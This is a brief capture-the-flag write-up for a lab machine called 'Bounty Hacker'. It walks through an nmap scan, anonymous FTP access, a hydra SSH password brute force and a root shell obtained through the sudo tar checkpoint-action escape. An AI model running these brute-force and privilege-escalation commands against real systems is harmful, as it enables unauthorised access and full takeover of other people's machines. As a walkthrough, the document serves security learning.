# Bounty Hacker

### Living up to the title.
Nmap scan shows ports 21,22,80 open:

      PORT   STATE SERVICE VERSION
      21/tcp open  ftp     vsftpd 3.0.3
      | ftp-anon: Anonymous FTP login allowed (FTP code 230)
      |_Can't get directory listing: TIMEOUT
      | ftp-syst: 
      |   STAT: 
      | FTP server status:
      |      Connected to ::ffff:10.11.85.53
      |      Logged in as ftp
      |      TYPE: ASCII
      |      No session bandwidth limit
      |      Session timeout in seconds is 300
      |      Control connection is plain text
      |      Data connections will be plain text
      |      At session startup, client count was 3
      |      vsFTPd 3.0.3 - secure, fast, stable
      |_End of status
      22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
      |   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
      |_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
      80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: Site doesn't have a title (text/html).

FTP server allows anonymous login and contains two files `locks.txt` is a wordlists of possible password, while `task.txt` contains the following: <br />
![image](https://github.com/user-attachments/assets/87765352-9b2e-4890-994e-62136ce73662)<br />
I try to bruteforce ssh login with `lin` using the provided wordlist: `hydra -l lin -P locks.txt 10.10.26.125 ssh` and it works. I have acess to lin's ssh account.<br />
For privesc, if I run `sudo -l` I get: <br />
![image](https://github.com/user-attachments/assets/24cd0ff7-1f3f-4a2e-835a-56f04e5c9b3e)<br />
The exploit for tar can be found on [gtfobins](https://gtfobins.github.io/gtfobins/tar/#sudo). Just run `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` to become root. 
